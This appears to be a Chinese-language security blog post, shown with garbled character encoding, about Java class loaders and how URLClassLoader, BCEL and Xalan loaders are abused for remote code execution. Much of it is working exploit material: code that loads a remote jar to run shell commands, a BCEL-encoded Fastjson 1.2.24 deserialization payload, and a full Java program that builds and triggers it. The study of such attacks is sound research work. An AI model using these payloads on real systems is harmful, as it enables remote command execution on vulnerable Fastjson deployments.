116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 0, 33, 0, 5, 0, 6, 0, 0, 0, 0, 0, 2, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 8, 0, 1, 0, 9, 0, 0, 0, 37, 0, 2, 0, 1, 0, 0, 0, 9, -78, 0, 2, 18, 3, -74, 0, 4, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 10, 0, 2, 0, 0, 0, 13, 0, 8, 0, 14, 0, 1, 0, 12, 0, 0, 0, 2, 0, 13 }; public static class ClassLoaderA extends ClassLoader{ public ClassLoaderA(ClassLoader parent) { super(parent); } { defineClass(testClassName,testClassBytes,0, testClassBytes.length); } } public static class ClassLoaderB extends ClassLoader{ public ClassLoaderB(ClassLoader parent) { super(parent); } { defineClass(testClassName,testClassBytes,0, testClassBytes.length); } } public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { // çˆ¶ç±»åŠ è½½å™¨ ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader(); // Aç±»åŠ è½½å™¨ ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader); // Bç±»åŠ è½½å™¨ ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader); // ä½¿ç”¨A/Bç±»åŠ è½½å™¨åŠ è½½åŒä¸€ä¸ªç±» Class\u0026lt;?\u0026gt; aClass = Class.forName(testClassName, true, aClassLoader); Class\u0026lt;?\u0026gt; aaClass = Class.forName(testClassName, true, aClassLoader); Class\u0026lt;?\u0026gt; bClass = Class.forName(testClassName, true, bClassLoader); // æ¯”è¾ƒAç±»åŠ è½½å’ŒBç±»åŠ è½½å™¨åŠ è½½çš„ç±»æ˜¯å¦ç›¸ç­‰ System.out.println(\u0026#34;aClass == aaClassï¼š\u0026#34; + (aClass == aaClass)); System.out.println(\u0026#34;aClass == bClassï¼š\u0026#34; + (aClass == bClass)); System.out.println(\u0026#34;\\n\u0026#34; + aaClass.getName() + \u0026#34;:æ–¹æ³•æ¸…å•\u0026#34;); // è·å–è¯¥ç±»æ‰€æœ‰æ–¹æ³• Method[] methods = aClass.getMethods(); for (Method method : methods){ System.out.println(method); } // åˆ›å»ºå®ä¾‹ Object object = aClass.newInstance(); // è·å–æ–¹æ³• Method method = object.getClass().getMethod(\u0026#34;hello\u0026#34;); // æ‰§è¡Œæ–¹æ³• String result = (String) method.invoke(object); System.out.println(result); } } è¾“å‡ºå¦‚ä¸‹\nClassLoaderæ”»å‡» URLClassLoader URLClassLoaderç»§æ‰¿äº†ClassLoaderï¼ŒURLClassLoaderæä¾›äº†åŠ è½½è¿œç¨‹èµ„æºçš„èƒ½åŠ›ï¼Œåœ¨å†™æ¼æ´åˆ©ç”¨çš„payloadæˆ–è€…webshellçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ¥åŠ è½½è¿œç¨‹çš„jaræ¥å®ç°è¿œç¨‹çš„ç±»æ–¹æ³•è°ƒç”¨ã€‚\nå¦‚æœè¯´æˆ‘ä»¬çš„æ¶æ„payloadå¯ä»¥è¿œç¨‹åŠ è½½æˆ‘ä»¬çš„è¿œç¨‹æ¶æ„jaråŒ…ï¼Œå³å¯å®ç°RCEã€‚\nä»£ç å¦‚ä¸‹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package com.reus.classloader; import java.io.ByteArrayOutputStream; import java.io.InputStream; import java.net.URL; import java.net.URLClassLoader; /** * @ClassName TestUrlClassLoader * @Description TODO * @Author reus09 * @Date 2022/10/18 20:31 * @Version 1.0 **/ public class TestUrlClassLoader { public static void main(String[] args) { try { // å®šä¹‰è¿œç¨‹åŠ è½½çš„jarè·¯å¾„ URL url = new URL(\u0026#34;http://127.0.0.1:8000/cmd.jar\u0026#34;); // åˆ›å»ºURLClassLoaderå¯¹è±¡ï¼Œå¹¶åŠ è½½è¿œç¨‹jaråŒ… URLClassLoader ucl = new URLClassLoader(new URL[]{url}); // å®šä¹‰éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ String cmd = \u0026#34;ls\u0026#34;; // é€šè¿‡URLClassLoaderåŠ è½½è¿œç¨‹jaråŒ…ä¸­çš„CMDç±» Class cmdClass = ucl.loadClass(\u0026#34;CMD\u0026#34;); // è°ƒç”¨CMDç±»ä¸­çš„execæ–¹æ³•ï¼Œç­‰ä»·äº: Process process = CMD.exec(\u0026#34;whoami\u0026#34;); Process process = (Process) cmdClass.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(null, cmd); // è·å–å‘½ä»¤æ‰§è¡Œç»“æœçš„è¾“å…¥æµ InputStream in = process.getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; // è¯»å–å‘½ä»¤æ‰§è¡Œç»“æœ while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } // è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ System.out.println(baos.toString()); } catch (Exception e) { e.printStackTrace(); } } } CMD.jaråŒ…é‡Œé¢ä¸­å°±ä¸€ä¸ªCMD.classæ–‡ä»¶ï¼Œå¯¹åº”çš„ç¼–è¯‘ä¹‹å‰çš„ä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 import java.io.IOException; public class CMD { public static Process exec(String cmd) throws IOException { return Runtime.getRuntime().exec(cmd); } } ç¨‹åºæ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š\nBCEL ClassLoader BCELï¼ˆApache Commons BCELâ„¢ï¼‰æ˜¯ä¸€ä¸ªç”¨äºåˆ†æã€åˆ›å»ºå’Œæ“çºµJavaç±»æ–‡ä»¶çš„å·¥å…·åº“ï¼ŒOracle JDKå¼•ç”¨äº†BCELåº“ï¼Œä¸è¿‡ä¿®æ”¹äº†åŸåŒ…åorg.apache.bcel.util.ClassLoaderä¸ºcom.sun.org.apache.bcel.internal.util.ClassLoaderï¼ŒBCELçš„ç±»åŠ è½½å™¨åœ¨è§£æç±»åæ—¶ä¼šå¯¹ClassNameä¸­æœ‰$$BCEL$$æ ‡è¯†çš„ç±»åšç‰¹æ®Šå¤„ç†ï¼Œè¯¥ç‰¹æ€§ç»å¸¸è¢«ç”¨äºç¼–å†™å„ç±»æ”»å‡»Payloadã€‚\nBCELæ”»å‡»åŸç† å½“BCELçš„com.sun.org.apache.bcel.internal.util.ClassLoader#loadClassåŠ è½½ä¸€ä¸ªç±»åä¸­å¸¦æœ‰$$BCEL$$çš„ç±»æ—¶ä¼šæˆªå–å‡º$$BCEL$$åé¢çš„å­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨com.sun.org.apache.bcel.internal.classfile.Utility#decodeå°†å­—ç¬¦ä¸²è§£ææˆç±»å­—èŠ‚ç ï¼ˆå¸¦æœ‰æ”»å‡»ä»£ç çš„æ¶æ„ç±»ï¼‰ï¼Œæœ€åä¼šè°ƒç”¨defineClassæ³¨å†Œè§£ç åçš„ç±»ï¼Œä¸€æ—¦è¯¥ç±»è¢«åŠ è½½å°±ä¼šè§¦å‘ç±»ä¸­çš„æ¶æ„ä»£ç ï¼Œæ­£æ˜¯å› ä¸ºBCELæœ‰äº†è¿™ä¸ªç‰¹æ€§ï¼Œæ‰å¾—ä»¥è¢«å¹¿æ³›çš„åº”ç”¨äºå„ç±»æ”»å‡»Payloadä¸­ã€‚\nBCELç¼–ç ï¼š\n1 2 3 4 private static final byte[] CLASS_BYTES = new byte[]{ç±»å­—èŠ‚ç byteæ•°ç»„}]; // BCELç¼–ç ç±»å­—èŠ‚ç  String className = \u0026#34;$$BCEL$$\u0026#34; + com.sun.org.apache.bcel.internal.classfile.Utility.encode(CLASS_BYTES, true); ç¼–ç åçš„ç±»åï¼š$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85S$dbn$d......ï¼ŒBCELä¼šå¯¹ç±»å­—èŠ‚ç è¿›è¡Œç¼–ç ï¼Œ\nBCELè§£ç ï¼š\n1 2 3 4 5 int index = className.indexOf(\u0026#34;$$BCEL$$\u0026#34;); String realName = className.substring(index + 8); // BCELè§£ç ç±»å­—èŠ‚ç  byte[] bytes = com.sun.org.apache.bcel.internal.classfile.Utility.decode(realName, true); å¦‚æœè¢«åŠ è½½çš„ç±»åä¸­åŒ…å«äº†$$BCEL$$å…³é”®å­—ï¼ŒBCELå°±ä¼šä½¿ç”¨ç‰¹æ®Šçš„æ–¹å¼è¿›è¡Œè§£ç å¹¶åŠ è½½è§£ç ä¹‹åçš„ç±»ã€‚\nBCELå…¼å®¹æ€§é—®é¢˜ BCELè¿™ä¸ªç‰¹æ€§ä»…é€‚ç”¨äºBCEL 6.0ä»¥ä¸‹ï¼Œå› ä¸ºä»6.0å¼€å§‹org.apache.bcel.classfile.ConstantUtf8#setByteså°±å·²ç»è¿‡æ—¶äº†ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 /** * @param bytes the raw bytes of this Utf-8 * @deprecated (since 6.0) */ @java.lang.Deprecated public final void setBytes( final String bytes ) { throw new UnsupportedOperationException(); } Oracleè‡ªå¸¦çš„BCELæ˜¯ä¿®æ”¹äº†åŸå§‹çš„åŒ…åï¼Œå› æ­¤ä¹Ÿæœ‰å…¼å®¹æ€§é—®é¢˜ï¼Œå·²çŸ¥æ”¯æŒè¯¥ç‰¹æ€§çš„JDKç‰ˆæœ¬ä¸ºï¼šJDK1.5 - 1.7ã€JDK8 - JDK8u241ã€JDK9ã€‚\nBCEL FastJsonæ”»å‡»é“¾åˆ†æ Fastjsonï¼ˆ1.1.15 - 1.2.24ï¼‰å¯ä»¥ä½¿ç”¨å…¶ä¸­æœ‰ä¸ªdbcpçš„Payloadå°±æ˜¯åˆ©ç”¨äº†BCELæ”»å‡»é“¾ï¼Œåˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 { \u0026#34;@type\u0026#34;:\u0026#34;org.apache.commons.dbcp.BasicDataSource\u0026#34;, \u0026#34;driverClassName\u0026#34;:\u0026#34;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85R$5bO$TA$U$fe$a6$z$dde$bbXX$$$e2$F$z$8aPJ$e9r$x$X$r$3e$d8$60$a2$U1$b6$b1$89o$d3$e9$a4$ynw$9b$dd$a9$c2$l1$f1$X$f0$cc$L$S$l$fc$B$fe$p$l4$9e$5d$h$U$rqvsf$ce7$e7$7c$e7$9b$99$f3$f5$c7$e7$_$AV$b0i$m$8b$9b$3an$e9$b8m$60$Kwt$dc5$90$c3$b4$8e$7b$3a$ee$eb$981$f0$A$b3$91$99$d3$907$60b$5eCA$c3$CCz$db$f1$i$f5$98$n$99$9f$7f$cd$90$aa$f8$z$c9$90$ad$3a$9e$7c$d1$eb4eP$e7M$97$Q$7d$5b$b8$fd$c8$a1$9a$e2$e2$ed$k$ef$c6$5b$g$8a$c4$c9$60$d4$fc$5e$m$e4S$t$8a$b6$ea2TO$w$3b$d5$8a$cb$c3$b0t$c8$dfq$T$c3$Ya$98$f0$bb$d2$cb$z$f2$5c$85$bb$a2$e7r$e5$H$r$de$ed2h$7eX$f2x$87$f8$WM$94$60$T$d2p$bc$96$ff$3e$a4$K$s$96$b0L$c9$82$92r$cb$x$abk$e5$f5$8d$cd$ad$a5$fe$8aa$80$f4$f6$8e$Y$c6D$_ps$aeOq$H$7e$a8$kn$d1$b05$ac$98X$c5$9a$892$d6$ZF$p5$b6$e3$db$cf$f6w$8e$84$ec$w$c7$f7LlD$e2$e6$84$df$b1$b9$d7$e4$8e$jJa$8bH$bc$eb$f3$96$M$ecK$Hb$Y$8eI$5c$ee$b5$ed$fd$e6$a1$U$ea$STS$81$e3$b5$_C$c7$a1$92$j$86L$5b$aa$97$B$5dB$a0$8e$Zf$f3$d5$bf$b3$k$cd$ff$L$d1$ed$86$8a$H$wl8$ea$80a$fc$aa$ac7$M$p$bf$d1W$3dO9$jz$J$83$ea$5d8$e3$f9$3f$c9$fb0$b1$a7$e4$91$Ut$fc$ff$a8$n$ddB$86$n$rd$bb$b4$a9$e2$3e$a8$H$5cHL$e3$g$f5$604$S$60$d1K$93$b5$c8$9b$a2$99$d1$3cP$f8$EvJ$L$ba$7f$b2$e9_$mt$8c$5d$84$7e$a0$d4$q$cde$x$b1k$r$cf$91$aa$$X$DgH$7f$c4$a0$a5$ed$9e$m$bb$60$e9$b1$9b$b6$Gw$cfa$U$ce$90i$9c$40$df$x$9ea$e8$94HfP$84M$bd$9d$88K$94$90$n$ab$T$e5$m$7d$Z$wab$SC$b1$d2$Z$f2$8a$Y$a7$e8Qj$ac1$aca$82$3c$90$97$fa$8eI$N$T$f4g$9ek$b8$fe$N$v$o$9e$8c$8fu$e3$t$b2$b7e$b6p$D$A$A\u0026#34;, \u0026#34;driverClassLoader\u0026#34;: {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.bcel.util.ClassLoader\u0026#34;} } FastJsonè‡ªåŠ¨è°ƒç”¨setteræ–¹æ³•ä¿®æ”¹org.apache.commons.dbcp.BasicDataSourceç±»çš„driverClassNameå’ŒdriverClassLoaderå€¼ï¼ŒdriverClassNameæ˜¯ç»è¿‡BCELç¼–ç åçš„com.reus.classloader.Calcç±»å­—èŠ‚ç ï¼ŒdriverClassLoaderæ˜¯ä¸€ä¸ªç”±FastJsonåˆ›å»ºçš„org.apache.bcel.util.ClassLoaderå®ä¾‹ã€‚\nFastJsonè‡ªåŠ¨è°ƒç”¨setteræ–¹æ³•ä¿®æ”¹org.apache.commons.dbcp.BasicDataSourceç±»çš„driverClassNameå’ŒdriverClassLoaderå€¼ï¼ŒdriverClassNameæ˜¯ç»è¿‡BCELç¼–ç åçš„com.anbai.sec.classloader.TestBCELClassç±»å­—èŠ‚ç ï¼ŒdriverClassLoaderæ˜¯ä¸€ä¸ªç”±FastJsonåˆ›å»ºçš„org.apache.bcel.util.ClassLoaderå®ä¾‹ã€‚\nCalcç±»ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class Calc { static { String command = \u0026#34;open -a Calculator.app\u0026#34;; String osName = System.getProperty(\u0026#34;os.name\u0026#34;); if (osName.startsWith(\u0026#34;Windows\u0026#34;)) { command = \u0026#34;calc 12345678901234567\u0026#34;; } else if (osName.startsWith(\u0026#34;Linux\u0026#34;)) { command = \u0026#34;curl localhost:9999/\u0026#34;; } try { Runtime.getRuntime().exec(command); } catch (IOException e) { e.printStackTrace(); } } } ä»JSONååºåˆ—åŒ–å®ç°æ¥çœ‹ï¼Œåªæ˜¯æ³¨å…¥äº†ç±»åå’Œç±»åŠ è½½å™¨å¹¶ä¸è¶³ä»¥è§¦å‘ç±»åŠ è½½ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œçš„å…³é”®é—®é¢˜å°±åœ¨äºFastJsonä¼šè‡ªåŠ¨è°ƒç”¨getteræ–¹æ³•ï¼Œorg.apache.commons.dbcp.BasicDataSourceæœ¬æ²¡æœ‰connectionæˆå‘˜å˜é‡ï¼Œä½†æœ‰ä¸€ä¸ªgetConnection()æ–¹æ³•ï¼ŒæŒ‰ç†æ¥è®²åº”è¯¥ä¸ä¼šè°ƒç”¨getConnection()æ–¹æ³•ï¼Œä½†æ˜¯FastJsonä¼šé€šè¿‡getConnection()è¿™ä¸ªæ–¹æ³•åè®¡ç®—å‡ºä¸€ä¸ªåä¸ºconnectionçš„fieldï¼Œè¯¦æƒ…å‚è§ï¼šcom.alibaba.fastjson.util.TypeUtils#computeGettersï¼Œå› æ­¤FastJsonæœ€ç»ˆè¿˜æ˜¯è°ƒç”¨äº†getConnection()æ–¹æ³•ã€‚åœ¨getConnection()æ–¹æ³•ä¸­ï¼Œä¼šè°ƒç”¨createDataSource().getConnection(),åœ¨createDataSource()æ–¹æ³•ä¸­è°ƒç”¨äº†createConnectionFactoryæ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­é€šè¿‡Class.forName()å®ç°äº†å¯¹æˆ‘ä»¬ä¼ å…¥çš„classloaderå’Œå¯¹åº”çš„classæ–‡ä»¶åŠ è½½ï¼Œä»è€Œå®ç°æ”»å‡»ã€‚\nå› ä¸ºä½¿ç”¨äº†åå°„çš„æ–¹å¼åŠ è½½com.anbai.sec.classloader.Calcç±»ï¼Œè€Œä¸”è¿˜ç‰¹æ„æŒ‡å®šäº†éœ€è¦åˆå§‹åŒ–ç±»ï¼ˆClass.forName(driverClassName, true, driverClassLoader);ï¼‰ï¼Œå› æ­¤è¯¥ç±»çš„é™æ€è¯­å¥å—ï¼ˆstatic{...}ï¼‰å°†ä¼šè¢«æ‰§è¡Œï¼Œå®Œæ•´çš„æ”»å‡»ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š\næœ€ç»ˆçš„æ”»å‡»ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 package com.reus.classloader; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.sun.org.apache.bcel.internal.classfile.Utility; import org.apache.commons.dbcp.BasicDataSource; import org.apache.bcel.util.ClassLoader; // import org.javaweb.*; import java.io.File; import java.io.IOException; import java.util.LinkedHashMap; import java.util.Map; public class BCELClassLoader { /** * com.anbai.sec.classloader.TestBCELClassç±»å­—èŠ‚ç ï¼ŒWindowså’ŒMacOSå¼¹è®¡ç®—å™¨ï¼ŒLinuxæ‰§è¡Œcurl localhost:9999 * \u0026lt;/pre\u0026gt; */ private static final byte[] CLASS_BYTES = new byte[]{ -54, -2, -70, -66, 0, 0, 0, 50, 0, 56, 10, 0, 15, 0, 26, 8, 0, 27, 8, 0, 28, 10, 0, 29, 0, 30, 8, 0, 31, 10, 0, 32, 0, 33, 8, 0, 34, 8, 0, 35, 8, 0, 36, 10, 0, 37, 0, 38, 10, 0, 37, 0, 39, 7, 0, 40, 10, 0, 12, 0, 41, 7, 0, 42, 7, 0, 43, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 44, 7, 0, 40, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 18, 84, 101, 115, 116, 66, 67, 69, 76, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 16, 0, 17, 1, 0, 22, 111, 112, 101, 110, 32, 45, 97, 32, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 46, 97, 112, 112, 1, 0, 7, 111, 115, 46, 110, 97, 109, 101, 7, 0, 45, 12, 0, 46, 0, 47, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 7, 0, 44, 12, 0, 48, 0, 49, 1, 0, 22, 99, 97, 108, 99, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55, 1, 0, 5, 76, 105, 110, 117, 120, 1, 0, 20, 99, 117, 114, 108, 32, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 57, 57, 57, 57, 47, 7, 0, 50, 12, 0, 51, 0, 52, 12, 0, 53, 0, 54, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 55, 0, 17, 1, 0, 39, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 66, 67, 69, 76, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 11, 103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101, 0, 33, 0, 14, 0, 15, 0, 0, 0, 0, 0, 2, 0, 1, 0, 16, 0, 17, 0, 1, 0, 18, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 8, 0, 20, 0, 17, 0, 1, 0, 18, 0, 0, 0, -106, 0, 2, 0, 3, 0, 0, 0, 53, 18, 2, 75, 18, 3, -72, 0, 4, 76, 43, 18, 5, -74, 0, 6, -103, 0, 9, 18, 7, 75, -89, 0, 15, 43, 18, 8, -74, 0, 6, -103, 0, 6, 18, 9, 75, -72, 0, 10, 42, -74, 0, 11, 87, -89, 0, 8, 77, 44, -74, 0, 13, -79, 0, 1, 0, 36, 0, 44, 0, 47, 0, 12, 0, 2, 0, 19, 0, 0, 0, 46, 0, 11, 0, 0, 0, 8, 0, 3, 0, 9, 0, 9, 0, 11, 0, 18, 0, 12, 0, 24, 0, 13, 0, 33, 0, 14, 0, 36, 0, 18, 0, 44, 0, 21, 0, 47, 0, 19, 0, 48, 0, 20, 0, 52, 0, 22, 0, 21, 0, 0, 0, 19, 0, 4, -3, 0, 24, 7, 0, 22, 7, 0, 22, 11, 74, 7, 0, 23, -7, 0, 4, 0, 1, 0, 24, 0, 0, 0, 2, 0, 25 }; /** * å°†ä¸€ä¸ªClassæ–‡ä»¶ç¼–ç æˆBCELç±» * * @param classFile Classæ–‡ä»¶è·¯å¾„ * @return ç¼–ç åçš„BCELç±» * @throws IOException æ–‡ä»¶è¯»å–å¼‚å¸¸ */ // public static String bcelEncode(File classFile) throws IOException { // return \u0026#34;$$BCEL$$\u0026#34; + Utility.encode(FileUtils.readFileToByteArray(classFile), true); // } /** * BCELå‘½ä»¤æ‰§è¡Œç¤ºä¾‹ï¼Œæµ‹è¯•æ—¶è¯·æ³¨æ„å…¼å®¹æ€§é—®é¢˜ï¼šâ‘  é€‚ç”¨äºBCEL 6.0ä»¥ä¸‹ã€‚â‘¡ JDKç‰ˆæœ¬ä¸ºï¼šJDK1.5 - 1.7ã€JDK8 - JDK8u241ã€JDK9 * * @throws Exception ç±»åŠ è½½å¼‚å¸¸ */ public static void bcelTest() throws Exception { // ä½¿ç”¨åå°„æ˜¯ä¸ºäº†é˜²æ­¢é«˜ç‰ˆæœ¬JDKä¸å­˜åœ¨com.sun.org.apache.bcel.internal.util.ClassLoaderç±» Class\u0026lt;?\u0026gt; bcelClass = Class.forName(\u0026#34;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026#34;); // åˆ›å»ºBCELç±»åŠ è½½å™¨ ClassLoader classLoader = (ClassLoader) bcelClass.newInstance(); // ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader(); // ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader() // BCELç¼–ç ç±»å­—èŠ‚ç  String className = \u0026#34;$$BCEL$$\u0026#34; + Utility.encode(CLASS_BYTES, true); System.out.println(className); Class\u0026lt;?\u0026gt; clazz = Class.forName(className, true, classLoader); System.out.println(clazz); } /** * Fastjson 1.1.15 - 1.2.4 ååºåˆ—åŒ–RCEç¤ºä¾‹ï¼Œç¤ºä¾‹ç¨‹åºè€ƒè™‘åˆ°æµ‹è¯•ç¯å¢ƒçš„å…¼å®¹æ€§ï¼Œé‡‡ç”¨çš„éƒ½æ˜¯Apache commons dbcpå’Œbcel * * @throws IOException BCELç¼–ç å¼‚å¸¸ */ public static void fastjsonRCE() throws IOException { // BCELç¼–ç ç±»å­—èŠ‚ç  String className = \u0026#34;$$BCEL$$\u0026#34; + Utility.encode(CLASS_BYTES, true); // æ„å»ºæ¶æ„çš„JSON Map\u0026lt;String, Object\u0026gt; dataMap = new LinkedHashMap\u0026lt;String, Object\u0026gt;(); Map\u0026lt;String, Object\u0026gt; classLoaderMap = new LinkedHashMap\u0026lt;String, Object\u0026gt;(); dataMap.put(\u0026#34;@type\u0026#34;, BasicDataSource.class.getName()); dataMap.put(\u0026#34;driverClassName\u0026#34;, className); classLoaderMap.put(\u0026#34;@type\u0026#34;, org.apache.bcel.util.ClassLoader.class.getName()); dataMap.put(\u0026#34;driverClassLoader\u0026#34;, classLoaderMap); String json = JSON.toJSONString(dataMap); System.out.println(json); JSONObject jsonObject = JSON.parseObject(json); System.out.println(jsonObject); } public static void main(String[] args) throws Exception { // bcelTest(); fastjsonRCE(); } } Xalan ClassLoader Xalanå’ŒBCELä¸€æ ·éƒ½ç»å¸¸è¢«ç”¨äºç¼–å†™ååºåˆ—åŒ–Payloadï¼ŒOracle JDKé»˜è®¤ä¹Ÿå¼•ç”¨äº†Xalanï¼ŒåŒæ—¶ä¿®æ”¹äº†åŸåŒ…åorg.apache.xalan.xsltc.trax.TemplatesImplä¸ºcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplï¼ŒXalanæœ€å¤§çš„ç‰¹ç‚¹æ˜¯å¯ä»¥ä¼ å…¥ç±»å­—èŠ‚ç å¹¶åˆå§‹åŒ–ï¼ˆéœ€è¦è°ƒç”¨getOutputPropertiesæ–¹æ³•ï¼‰ï¼Œä»è€Œå®ç°RCEï¼Œæ¯”å¦‚Fastjsonå’ŒJacksonä¼šä½¿ç”¨åå°„è°ƒç”¨getter/setteræˆ–æˆå‘˜å˜é‡æ˜ å°„çš„æ–¹å¼å®ç°JSONååºåˆ—åŒ–ã€‚\nTemplatesImplä¸­æœ‰ä¸€ä¸ª_bytecodesæˆå‘˜å˜é‡ï¼Œç”¨äºå­˜å‚¨ç±»å­—èŠ‚ç ï¼Œé€šè¿‡JSONååºåˆ—åŒ–çš„æ–¹å¼å¯ä»¥ä¿®æ”¹è¯¥å˜é‡å€¼ï¼Œä½†å› ä¸ºè¯¥æˆå‘˜å˜é‡æ²¡æœ‰å¯æ˜ å°„çš„get/setæ–¹æ³•æ‰€ä»¥éœ€è¦ä¿®æ”¹JSONåº“çš„è™šæ‹ŸåŒ–é…ç½®ï¼Œæ¯”å¦‚Fastjsonè§£ææ—¶å¿…é¡»å¯ç”¨Feature.SupportNonPublicFieldã€Jacksonå¿…é¡»å¼€å¯JacksonPolymorphicDeserializationï¼ˆè°ƒç”¨mapper.enableDefaultTyping()ï¼‰ï¼Œæ‰€ä»¥åˆ©ç”¨æ¡ä»¶ç›¸å¯¹è¾ƒé«˜ã€‚\nè¿™é‡Œå‘ç°å…¶å®æ˜¯ä¹‹å‰åˆ†æçš„fastJson1.2.24çš„TemplatesImpl ååºåˆ—åŒ–é“¾ä¸€æ ·,\nè¯¦æƒ…ä¹‹å‰çš„çœ‹åšå®¢å…³äºtemplateImplé“¾çš„å­¦ä¹ ã€‚\nå€¼å¾—æ³¨æ„çš„æ˜¯æ¶æ„ç±»å¿…é¡»è¦ç»§æ‰¿AbstractTransletã€‚\n","permalink":"http://www.reus09.top/posts/tech/java%E4%B9%8Bclassloader/","summary":"è¿™ç¯‡ä¸»è¦è®°å½•ä¸€ä¸‹å¯¹äºclassloaderçš„å­¦ä¹ ã€‚ ç±»åŠ è½½æœºåˆ¶ Javaä¸­çš„æºç 